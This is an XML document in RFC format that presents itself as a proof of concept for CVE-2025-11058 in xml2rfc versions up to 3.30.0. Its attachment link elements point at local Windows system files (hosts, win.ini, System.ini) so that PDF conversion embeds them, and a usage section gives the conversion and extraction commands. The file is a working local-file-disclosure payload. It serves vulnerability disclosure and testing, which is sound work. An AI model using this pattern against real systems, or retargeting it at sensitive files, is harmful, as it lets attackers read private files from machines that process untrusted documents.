<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-windows-system-00" category="info" submissionType="IETF">
  <link rel="attachment" href="C:/Windows/System32/drivers/etc/hosts"/>
  <link rel="attachment" href="C:/Windows/win.ini"/>
  <link rel="attachment" href="C:/Windows/System.ini"/>
  <front>
    <title>POC for Windows System Files</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
      <address>
        <email>security@example.com</email>
      </address>
    </author>
    <date year="2025" month="November" day="22"/>
    <area>Security</area>
    <workgroup>Security Testing</workgroup>
    <abstract>
      <t>This is a proof of concept for CVE-2025-11058 targeting Windows system files.
      When this XML is converted to PDF using the vulnerable version (xml2rfc &lt;= 3.30.0),
      Windows system files will be read and included as attachments in the PDF.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>This POC demonstrates reading Windows system configuration files including
      the hosts file, win.ini, and System.ini.</t>
    </section>
    <section anchor="targets">
      <name>Target Files</name>
      <t>The following Windows system files are targeted:</t>
      <ul>
        <li>C:/Windows/System32/drivers/etc/hosts - DNS host mappings</li>
        <li>C:/Windows/win.ini - Windows initialization file</li>
        <li>C:/Windows/System.ini - System configuration file</li>
      </ul>
    </section>
    <section anchor="usage">
      <name>Usage</name>
      <t>On Windows with xml2rfc &lt;= 3.30.0 installed:</t>
      <ol>
        <li>xml2rfc --pdf poc_windows_system.xml -o windows_system.pdf</li>
        <li>Extract attachments using pdfdetach or 7-Zip</li>
        <li>Review the extracted Windows system files</li>
      </ol>
    </section>
  </middle>
  <back/>
</rfc>
